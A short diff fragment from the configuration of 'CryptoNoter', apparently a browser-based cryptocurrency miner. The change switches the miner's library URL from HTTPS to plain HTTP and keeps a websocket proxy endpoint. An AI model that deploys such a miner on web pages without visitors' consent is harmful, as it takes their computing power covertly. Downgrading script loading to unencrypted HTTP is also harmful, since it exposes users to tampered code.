@@ -489,6 +489,6 @@
 })(window);
 self.CryptoNoter = self.CryptoNoter || {};
 self.CryptoNoter.CONFIG = {
-    LIB_URL: "https://nladuo.cn:7777/lib/",
+    LIB_URL: "http://nladuo.cn:7777/lib/",
     WEBSOCKET_SHARDS: [["wss://nladuo.cn:7777/proxy"]]
 };
